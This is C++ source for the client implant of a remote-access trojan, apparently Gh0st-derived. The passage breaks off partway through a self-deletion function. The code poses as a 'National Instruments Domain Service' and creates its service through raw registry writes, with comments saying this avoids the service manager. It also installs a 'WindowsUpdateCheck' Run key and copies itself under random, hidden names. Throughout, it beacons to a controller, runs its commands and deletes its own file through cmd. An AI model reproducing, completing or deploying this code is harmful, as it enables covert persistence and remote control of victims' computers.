// svchost.cpp : Defines the entry point for the console application.
//
#include "ClientSocket.h"
#include "Win7.H"
#include "common/KernelManager.h"
#include "common/login.h"
#include "common/install.h"
#include "common/until.h"
#include <shlwapi.h>
#include "common/KeyboardManager.h"
#pragma comment(lib, "DELAYIMP.LIB")
#pragma comment(linker, "/DELAYLOAD:WININET.dll")
#pragma comment(linker, "/DELAYLOAD:WS2_32.dll")
#pragma comment(linker, "/DELAYLOAD:PSAPI.DLL")
#pragma comment(linker, "/DELAYLOAD:GDI32.dll")
#pragma comment(linker, "/DELAYLOAD:ADVAPI32.dll")
#pragma comment(linker, "/DELAYLOAD:SHELL32.dll")

/*
#pragma comment(linker, "/DELAYLOAD:WINMM.dll")
#pragma comment(linker, "/DELAYLOAD:USER32.dll")
#pragma comment(linker, "/DELAYLOAD:WTSAPI32.dll")*/


#pragma comment(linker, "/DELAYLOAD:AVICAP32.dll")
#pragma comment(linker, "/DELAYLOAD:SHLWAPI.dll")
#pragma comment(linker, "/DELAYLOAD:IMM32.dll")
#pragma comment(linker, "/DELAYLOAD:urlmon.dll")
#pragma comment(linker, "/DELAYLOAD:OLEAUT32.dll")
#pragma comment(linker, "/DELAYLOAD:ole32.dll")
#pragma comment(linker, "/DELAYLOAD:NETAPI32.dll")
#pragma comment(linker, "/DELAY:nobind")
#pragma comment(linker, "/DELAY:unload")
enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

#define		HEART_BEAT_TIME		1000 * 60 * 3 // 心跳时间
HINSTANCE	g_hInstance = NULL;


DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
char	svcname[MAX_PATH];
static HANDLE g_hSingleton = NULL; // single-instance guard (kept for process lifetime)
int StormRand(int count);

struct Info
{
	char Address[100];
	char Port[10];
	char Mark[50];
	char SerName[100];
	char Serdisplay[128];
	char Serdesc[256];
	char strGroup[256];
	BOOL bDelete;
	BOOL bReg;
	char URL[256];
	char SerFile[MAX_PATH];
}MyInfo =
{
	"                                                          ",
		"",
		"",
		"National",
		"National Instruments Domain Service",
		"Provides a domain server for NI security.",
		"",
		TRUE,
		TRUE,
};


int StormRand(int count)
{
	unsigned long Time = GetTickCount();
	int seed = rand() + 3;
	seed = (seed * Time) % count;
	return seed;
}

// ============================================================
// ANSI -> 宽字符
// ============================================================
static void AnsiToWide(const char* src, wchar_t* dst, size_t dstCount)
{
	if (!src || !dst || dstCount == 0) return;
	MultiByteToWideChar(CP_ACP, 0, src, -1, dst, (int)dstCount);
	dst[dstCount - 1] = 0;
}

// ============================================================
// 通过注册表直接创建服务，绕过 CreateService / SCM
// ============================================================
static BOOL CreateServiceViaRegistry(const char* serviceName,
	const char* displayName,
	const char* description,
	const char* exePath)
{
	wchar_t wServiceName[256] = { 0 };
	wchar_t wDisplayName[512] = { 0 };
	wchar_t wDescription[1024] = { 0 };
	wchar_t wExePath[MAX_PATH] = { 0 };
	wchar_t wKeyPath[512] = { 0 };

	AnsiToWide(serviceName, wServiceName, 256);
	AnsiToWide(displayName, wDisplayName, 512);
	AnsiToWide(description, wDescription, 1024);
	AnsiToWide(exePath, wExePath, MAX_PATH);

	wsprintfW(wKeyPath, L"SYSTEM\\CurrentControlSet\\Services\\%s", wServiceName);

	HKEY  hKey = NULL;
	DWORD dwDisposition = 0;
	LONG  lRet = RegCreateKeyExW(
		HKEY_LOCAL_MACHINE,
		wKeyPath,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WRITE | KEY_WOW64_64KEY,
		NULL,
		&hKey,
		&dwDisposition);

	if (lRet != ERROR_SUCCESS)
		return FALSE;

	// ImagePath (REG_SZ，避免 % 展开痕迹)
	RegSetValueExW(hKey, L"ImagePath", 0, REG_SZ,
		(const BYTE*)wExePath,
		(DWORD)((wcslen(wExePath) + 1) * sizeof(wchar_t)));

	// Type = SERVICE_WIN32_OWN_PROCESS (0x10)
	DWORD dwType = 0x10;
	RegSetValueExW(hKey, L"Type", 0, REG_DWORD,
		(const BYTE*)&dwType, sizeof(dwType));

	// Start = SERVICE_AUTO_START (2)
	DWORD dwStart = 2;
	RegSetValueExW(hKey, L"Start", 0, REG_DWORD,
		(const BYTE*)&dwStart, sizeof(dwStart));

	// ErrorControl = SERVICE_ERROR_NORMAL (1)
	DWORD dwErrorControl = 1;
	RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD,
		(const BYTE*)&dwErrorControl, sizeof(dwErrorControl));

	// DisplayName
	RegSetValueExW(hKey, L"DisplayName", 0, REG_SZ,
		(const BYTE*)wDisplayName,
		(DWORD)((wcslen(wDisplayName) + 1) * sizeof(wchar_t)));

	// Description
	if (wDescription[0] != 0)
	{
		RegSetValueExW(hKey, L"Description", 0, REG_SZ,
			(const BYTE*)wDescription,
			(DWORD)((wcslen(wDescription) + 1) * sizeof(wchar_t)));
	}

	// DelayedAutoStart：让启动时序看起来更像系统原生延迟服务
	DWORD dwDelayed = 1;
	RegSetValueExW(hKey, L"DelayedAutoStart", 0, REG_DWORD,
		(const BYTE*)&dwDelayed, sizeof(dwDelayed));

	RegCloseKey(hKey);
	return TRUE;
}

#include "Wtsapi32.h"
#pragma comment(lib , "Wtsapi32.lib")
HANDLE RunInActiveSession(LPCTSTR lpCommandLine)
{
	HANDLE hProcess;
	HANDLE result;
	HANDLE hProcessInfo;

	HINSTANCE userenv = LoadLibrary("userenv.dll");
	typedef DWORD(WINAPI* CEB)(LPVOID* lpEnvironment, HANDLE hToken, BOOL bInherit);
	CEB  myCreateEnvironmentBlock = (CEB)GetProcAddress(userenv, "CreateEnvironmentBlock");


	LPVOID lpEnvironment = NULL;
	DWORD TokenInformation = 0;
	HANDLE hExistingToken = NULL;
	HANDLE hObject = NULL;

	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));

	ProcessInfo.hProcess = 0;
	ProcessInfo.hThread = 0;
	ProcessInfo.dwProcessId = 0;
	ProcessInfo.dwThreadId = 0;
	StartupInfo.cb = 68;
	StartupInfo.lpDesktop = "WinSta0\\Default";

	hProcess = GetCurrentProcess();
	OpenProcessToken(hProcess, 0xF01FFu, &hExistingToken);
	DuplicateTokenEx(hExistingToken, 0x2000000u, NULL, SecurityIdentification, TokenPrimary, &hObject);
	typedef DWORD(WINAPI* TWTSGetActiveConsoleSessionId)(void);

	TWTSGetActiveConsoleSessionId  MyWTSGetActiveConsoleSessionId;
	MyWTSGetActiveConsoleSessionId = (TWTSGetActiveConsoleSessionId)GetProcAddress(LoadLibrary("Kernel32.dll"), "WTSGetActiveConsoleSessionId");

	if (MyWTSGetActiveConsoleSessionId)
	{
		TokenInformation = MyWTSGetActiveConsoleSessionId();

		SetTokenInformation(hObject, TokenSessionId, &TokenInformation, sizeof(DWORD));
		myCreateEnvironmentBlock(&lpEnvironment, hObject, false);
		//		WTSQueryUserToken(TokenInformation,&hObject);
		CreateProcessAsUser(
			hObject,
			NULL,
			(TCHAR*)lpCommandLine,
			NULL,
			NULL,
			false,
			0x430u,
			lpEnvironment,
			NULL,
			&StartupInfo,
			&ProcessInfo);
		hProcessInfo = ProcessInfo.hProcess;
		CloseHandle(hObject);
		CloseHandle(hExistingToken);
		result = hProcessInfo;
	}
	else
	{
		result = 0;
	}

	if (userenv)
		FreeLibrary(userenv);

	return result;
}


static void RunService(char* m_ServiceName, char* m_DisplayName, char* m_Description)
{
	char FilePath[MAX_PATH];
	GetModuleFileName(NULL, FilePath, MAX_PATH);

	char SystemPath[MAX_PATH];
	GetSystemDirectory(SystemPath, MAX_PATH);
	if (strncmp(SystemPath, FilePath, strlen(SystemPath)) != 0)
	{
		char FileName[MAX_PATH];
		char* pSlash = strchr(MyInfo.SerFile, '\\');
		if (pSlash == NULL) pSlash = strchr(MyInfo.SerFile, '/');
		if (MyInfo.SerFile[0] != 0 && pSlash != NULL)
		{
			int nSFLen = lstrlen(MyInfo.SerFile);
			char chSFLast = MyInfo.SerFile[nSFLen - 1];
			if (chSFLast == '\\' || chSFLast == '/')
			{
				char szDir2[MAX_PATH];
				lstrcpyn(szDir2, MyInfo.SerFile, MAX_PATH);
				szDir2[nSFLen - 1] = 0;
				{
					char* pc2 = szDir2;
					while (*pc2)
					{
						if (*pc2 == '\\' || *pc2 == '/')
						{
							char ch2 = *pc2; *pc2 = 0;
							if (szDir2[0] != 0) CreateDirectoryA(szDir2, NULL);
							*pc2 = ch2;
						}
						pc2++;
					}
					if (szDir2[0] != 0) CreateDirectoryA(szDir2, NULL);
				}
				lstrcpyn(SystemPath, MyInfo.SerFile, MAX_PATH);
				wsprintf(SystemPath + nSFLen, "%c%c%c%c%c%c.exe", 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26));
			}
			else
			{
				char szDir[MAX_PATH];
				lstrcpyn(szDir, MyInfo.SerFile, MAX_PATH);
				char* pEnd = strrchr(szDir, '\\');
				if (pEnd == NULL) pEnd = strrchr(szDir, '/');
				if (pEnd) *pEnd = 0;
				{
					char* pc = szDir;
					while (*pc)
					{
						if (*pc == '\\' || *pc == '/')
						{
							char ch = *pc; *pc = 0;
							if (szDir[0] != 0) CreateDirectoryA(szDir, NULL);
							*pc = ch;
						}
						pc++;
					}
					if (szDir[0] != 0) CreateDirectoryA(szDir, NULL);
				}
				lstrcpyn(SystemPath, MyInfo.SerFile, MAX_PATH);
			}
		}
		else
		{
			if (MyInfo.SerFile[0] != 0)
				lstrcpyn(FileName, MyInfo.SerFile, sizeof(FileName));
			else
				wsprintf(FileName, "%c%c%c%c%c%c.exe", 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26));
			strcat(SystemPath, "\\");
			strcat(SystemPath, FileName);
		}
		CopyFileA(FilePath, SystemPath, FALSE);
		memset(FilePath, 0, MAX_PATH);
		strcpy(FilePath, SystemPath);
	}
	Sleep(5000);
	char MyPath[MAX_PATH];
	GetModuleFileName(NULL, MyPath, sizeof(MyPath));
	char run[] = { 'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n','\0' };
	WriteRegEx(HKEY_LOCAL_MACHINE, run, "WindowsUpdateCheck", REG_SZ, SystemPath, lstrlenA(SystemPath), 0);

	if (CreateServiceViaRegistry(m_ServiceName, m_DisplayName, m_Description, FilePath))
	{
		char CommandLine[MAX_PATH + 32];
		wsprintfA(CommandLine, "\"%s\" Win7", FilePath);
		HANDLE hActiveSession = RunInActiveSession(CommandLine);
		if (hActiveSession) CloseHandle(hActiveSession);
	}
}


/*
BOOL DeleteMe()
{
	TCHAR szModule [MAX_PATH],
		szComspec[MAX_PATH],
		szParams [MAX_PATH];

	// get file path names:
	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
		(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
		(GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
	{
		// set command shell parameters
		lstrcpy(szParams," /c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");
		lstrcat(szComspec, szParams);

		// set struct members
		STARTUPINFO		si={0};
		PROCESS_INFORMATION	pi={0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		// increase resource allocation to program
		SetPriorityClass(GetCurrentProcess(),
			REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(),
			THREAD_PRIORITY_TIME_CRITICAL);

		// invoke command shell
		if(CreateProcess(0, szComspec, 0, 0, 0,CREATE_SUSPENDED|
			DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// suppress command shell process until program exits
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);

			// resume shell process with new low priority
			ResumeThread(pi.hThread);

			// everything seemed to work
			return TRUE;
		}
		else // if error, normalize allocation
		{
			SetPriorityClass(GetCurrentProcess(),
				NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(),
				THREAD_PRIORITY_NORMAL);
		}
	}
	return FALSE;
}*/
//以下是服务的外壳。不用管这么多。因为要写注释也不知道怎么写。格式是固定的
static BOOL service_is_exist()
{
	char SubKey[MAX_PATH] = { 0 };
	strcpy(SubKey, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(SubKey, MyInfo.SerName);

	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, SubKey, 0L, KEY_READ, &hKey) == ERROR_SUCCESS)
		return TRUE;
	else
		return FALSE;
}

static HANDLE CreateWorldMutex(LPCSTR lpName, BOOL* pbExists)
{
	*pbExists = FALSE;
	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	SID_IDENTIFIER_AUTHORITY sa = SECURITY_WORLD_SID_AUTHORITY;
	PSID pWorld = NULL;
	PACL pAcl = NULL;
	if (AllocateAndInitializeSid(&sa, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pWorld))
	{
		EXPLICIT_ACCESS_A ea;
		ZeroMemory(&ea, sizeof(ea));
		ea.grfAccessPermissions = MUTEX_ALL_ACCESS;
		ea.grfAccessMode = SET_ACCESS;
		ea.grfInheritance = NO_INHERITANCE;
		ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		ea.Trustee.ptstrName = (LPSTR)pWorld;
		if (SetEntriesInAclA(1, &ea, NULL, &pAcl) == ERROR_SUCCESS)
			SetSecurityDescriptorDacl(&sd, TRUE, pAcl, FALSE);
	}
	SECURITY_ATTRIBUTES sattr;
	sattr.nLength = sizeof(sattr);
	sattr.lpSecurityDescriptor = &sd;
	sattr.bInheritHandle = FALSE;
	HANDLE h = CreateMutexA(&sattr, FALSE, lpName);
	DWORD dwErr = GetLastError();
	if (pWorld) FreeSid(pWorld);
	if (pAcl) LocalFree(pAcl);
	if (h && dwErr == ERROR_ALREADY_EXISTS)
	{
		*pbExists = TRUE;
		CloseHandle(h);
		return NULL;
	}
	if (h)
	{
		g_hSingleton = h; /* keep for process lifetime */
		return h;
	}
	/* Cannot create in Global namespace: open it to detect an existing owner. */
	HANDLE hOpen = OpenMutexA(SYNCHRONIZE, FALSE, lpName);
	if (hOpen)
	{
		*pbExists = TRUE;
		CloseHandle(hOpen);
		return NULL;
	}
	return (HANDLE)INVALID_HANDLE_VALUE; /* Global unavailable and no instance */
}

/* The service spawns a SYSTEM active-session copy ("<path> Win7"); the HKLM/HKCU
   Run key spawns a separate user copy. Only one of them may go online. */
static BOOL AcquireSingleton(BOOL bElevated)
{
	char szName[300];
	wsprintfA(szName, "Global\\HR_%s_Mutex", MyInfo.Address);
	if (!bElevated && service_is_exist())
	{
		/* Service is installed: let the SYSTEM active-session copy come up first. */
		for (int i = 0; i < 10; i++)
		{
			/* Probe only - do not create - so the SYSTEM copy gets priority. */
			HANDLE hProbe = OpenMutexA(SYNCHRONIZE, FALSE, szName);
			if (hProbe) { CloseHandle(hProbe); return FALSE; }
			Sleep(1000);
		}
	}
	BOOL bExists = FALSE;
	HANDLE h = CreateWorldMutex(szName, &bExists);
	if (bExists) return FALSE;
	if (h != INVALID_HANDLE_VALUE && h != NULL) return TRUE;
	/* Standard user without SeCreateGlobalPrivilege: same-session Local fallback. */
	char szLocal[300];
	wsprintfA(szLocal, "Local\\HR_%s_Mutex", MyInfo.Address);
	HANDLE lh = CreateMutexA(NULL, FALSE, szLocal);
	if (lh && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(lh);
		return FALSE;
	}
	if (lh) { g_hSingleton = lh; return TRUE; }
	return FALSE;
}
static SERVICE_STATUS srvStatus;
static SERVICE_STATUS_HANDLE hSrv;

static void __stdcall SvcCtrlFnct(DWORD CtrlCode)
{
	switch (CtrlCode)
	{
	case SERVICE_CONTROL_STOP:
		srvStatus.dwCheckPoint = 1;
		srvStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv, &srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint = 0;
		srvStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		srvStatus.dwCheckPoint = 1;
		srvStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv, &srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint = 0;
		srvStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_PAUSE:
		srvStatus.dwCheckPoint = 1;
		srvStatus.dwCurrentState = SERVICE_PAUSE_PENDING;
		SetServiceStatus(hSrv, &srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint = 0;
		srvStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		srvStatus.dwCheckPoint = 1;
		srvStatus.dwCurrentState = SERVICE_CONTINUE_PENDING;
		SetServiceStatus(hSrv, &srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint = 0;
		srvStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	}
	SetServiceStatus(hSrv, &srvStatus);
}
void ServiceMain(DWORD dwargc, wchar_t* argv[])
{
	typedef SERVICE_STATUS_HANDLE
	(WINAPI
		* RegisterServiceCtrlHandlerAT)(
			__in    LPCSTR                    lpServiceName,
			__in    __callback
			LPHANDLER_FUNCTION          lpHandlerProc
			);

	RegisterServiceCtrlHandlerAT pRegisterServiceCtrlHandlerA = (RegisterServiceCtrlHandlerAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"), "RegisterServiceCtrlHandlerA");

	hSrv = pRegisterServiceCtrlHandlerA(MyInfo.SerName, SvcCtrlFnct);
	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode = NO_ERROR;
	srvStatus.dwWaitHint = 2000;
	typedef BOOL
	(WINAPI
		* SetServiceStatusT)(
			__in        SERVICE_STATUS_HANDLE   hServiceStatus,
			__in        LPSERVICE_STATUS        lpServiceStatus
			);

	SetServiceStatusT pSetServiceStatus = (SetServiceStatusT)GetProcAddress(LoadLibrary("ADVAPI32.dll"), "SetServiceStatus");
	srvStatus.dwCheckPoint = 1;
	srvStatus.dwCurrentState = SERVICE_START_PENDING;
	pSetServiceStatus(hSrv, &srvStatus);
	srvStatus.dwCheckPoint = 0;
	Sleep(500);
	srvStatus.dwCurrentState = SERVICE_RUNNING;
	pSetServiceStatus(hSrv, &srvStatus);





	OSVERSIONINFO OSversion;
	OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);


	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
	{

		if (OSversion.dwMajorVersion >= 6)
		{
			char CommandLine[1024], MyPath[MAX_PATH];
			HANDLE 	hActiveSession = NULL;
			DWORD   ExitCode = 0;

			GetModuleFileName(NULL, MyPath, MAX_PATH);
			// 调试两天发现 直接运行rundll32.exe 会被某些下载者Kill  复制到
			wsprintfA(CommandLine, "%s Win7", MyPath);
			hActiveSession = RunInActiveSession(CommandLine);


			CloseHandle(hActiveSession);

			exit(0);
		}

	}



	HANDLE hMutex = CreateMutex(0, FALSE, MyInfo.Address);//创建内何对象用于防止运行两次以上
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ExitProcess(0);
		exit(0);
	}


	//////////////////////////////////////////////////////////////
	char	strServiceName[256] = { 0 };
	char	strKillEvent[50] = { 0 }; // 本地化：初始化防 OpenEvent 误匹配垃圾栈值导致 main 退出
	HANDLE	hInstallMutex = NULL;
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)SetProcessWindowStation(hWinSta);// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode(SEM_FAILCRITICALERRORS);
	/*
			char	*lpszHost = NULL;
			DWORD	dwPort = 80;
			char	*lpszProxyHost = NULL;
			DWORD	dwProxyPort = 0;
			char	*lpszProxyUser = NULL;
			char	*lpszProxyPass = NULL;*/


	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 半分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 500; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;

				}
				// 改一下
				Sleep(60);
			}
		}
		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(MyInfo.Address, atoi(MyInfo.Port)))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, MyInfo.Address, atoi(MyInfo.Port));
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
}


int main()
{
	// Single-instance guard: the service-spawned SYSTEM copy and the Run-key
	// user copy must not both go online.
	BOOL bElevatedCopy = (strstr(GetCommandLineA(), "Win7") != NULL);
	if (!AcquireSingleton(bElevatedCopy))
		return 0;
	char	strServiceName[256] = { 0 };
	char	strKillEvent[50] = { 0 }; // 本地化：初始化防 OpenEvent 误匹配垃圾栈值导致 main 退出
	HANDLE	hInstallMutex = NULL;
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)SetProcessWindowStation(hWinSta);// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode(SEM_FAILCRITICALERRORS);
	/*
			char	*lpszHost = NULL;
			DWORD	dwPort = 80;
			char	*lpszProxyHost = NULL;
			DWORD	dwProxyPort = 0;
			char	*lpszProxyUser = NULL;
			char	*lpszProxyPass = NULL;*/


	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 半分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 500; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;

				}
				// 改一下
				Sleep(60);
			}
		}
		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(MyInfo.Address, atoi(MyInfo.Port)))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, MyInfo.Address, atoi(MyInfo.Port));
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
	return 0;
}

//注册表启动
void AutoRun()
{
	char MyPath[MAX_PATH];
	GetModuleFileName(NULL, MyPath, MAX_PATH);
	char run[] = { 'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n','\0' };
	WriteRegEx(HKEY_LOCAL_MACHINE, run, "WindowsUpdateCheck", REG_SZ, MyPath, strlen(MyPath), 0);
	return;
}

// ============================================================
// Standard-user fallback: 写 HKLM / 创建服务 / 复制到 System32
// 都需要管理员权限。当进程处于 Medium IL 时退回到 %APPDATA%，
// 但文件名保留 MyInfo.SerFile 里的自定义部分（仅文件名，不含路径）。
// ★ FIXED: 原实现无条件使用随机 6 位名，忽略了控制端配置的
//          SerFile，导致"非 Administrator 用户 → 自定义名失效"。
// ============================================================
static void InstallUserRun()
{
	/* Standard-user fallback: writing HKLM, installing the service and copying
	   into System32 all require elevation. Drop a per-user copy in %APPDATA% and
	   register HKCU\...\Run so the host returns after this user logs on.
	   User scope only - this is not an elevation bypass. */
	char szAppData[MAX_PATH] = { 0 };
	if (GetEnvironmentVariableA("APPDATA", szAppData, MAX_PATH) == 0)
		return;
	char szSelf[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, szSelf, MAX_PATH);
	/* Re-entry from the per-user copy means persistence is already in place. */
	if (StrStrIA(szSelf, szAppData) != NULL)
		return;

	/* ★ FIXED: 从 SerFile 里取"最后一段文件名"作为落地文件名。
	   规则：
		 - SerFile 为空               -> 随机 6 位（保持原行为）
		 - SerFile 只有目录（尾部是 \ 或 /）-> 随机 6 位
		 - SerFile 形如 "C:\a\b\c.exe"     -> 取 "c.exe"
		 - SerFile 形如 "c.exe"（纯文件名）-> 取 "c.exe"
	   这样 UI 里填的自定义文件名在非管理员场景下也能生效。 */
	char szName[MAX_PATH] = { 0 };
	if (MyInfo.SerFile[0] != 0)
	{
		int nLen = lstrlenA(MyInfo.SerFile);
		char chLast = MyInfo.SerFile[nLen - 1];
		if (chLast != '\\' && chLast != '/')
		{
			const char* pName = MyInfo.SerFile;
			for (int i = 0; i < nLen; i++)
			{
				if (MyInfo.SerFile[i] == '\\' || MyInfo.SerFile[i] == '/')
					pName = &MyInfo.SerFile[i + 1];
			}
			if (*pName)
				lstrcpynA(szName, pName, MAX_PATH);
		}
	}
	if (szName[0] == 0)
	{
		wsprintfA(szName, "%c%c%c%c%c%c.exe",
			'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26),
			'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26));
	}

	char szDst[MAX_PATH] = { 0 };
	wsprintfA(szDst, "%s\\%s", szAppData, szName);
	if (!CopyFileA(szSelf, szDst, FALSE))
		return;
	SetFileAttributesA(szDst, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	char szRun[] = { 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n','\0' };
	WriteRegEx(HKEY_CURRENT_USER, szRun, "WindowsUpdateCheck", REG_SZ, szDst, lstrlenA(szDst), 0);
}
#include <shlobj.h>   
#pragma comment(lib,"shell32.lib")
BOOL DeleteMyself()
{
	CHAR szModule[MAX_PATH] = { 0 };//本文件的名称
	CHAR szComSpec[MAX_PATH] = { 0 };//CMD的名称
	CHAR szParams[MAX_PATH] = { 0 };//传给CMD的命令参数

	//获取本文件的名称
	GetModuleFileName(NULL, szModule, sizeof(szModule));
	GetShortPathName(szModule, szModule, MAX_PATH);

	//获取CMD的名称
	GetEnvironmentVariable("COMSPEC", szComSpec, sizeof(szComSpec));

	//设置命令参数
	lstrcat(szParams, "/c del ");
	lstrcat(szParams, szModule);
	lstrcat(szParams, " > nul");

	//设置成员结构
	SHELLEXECUTEINFO SEI;
	SEI.cbSize = sizeof(SEI);
	SEI.hwnd = NULL;
	SEI.lpVerb = "Open";
	SEI.lpFile = szComSpec;
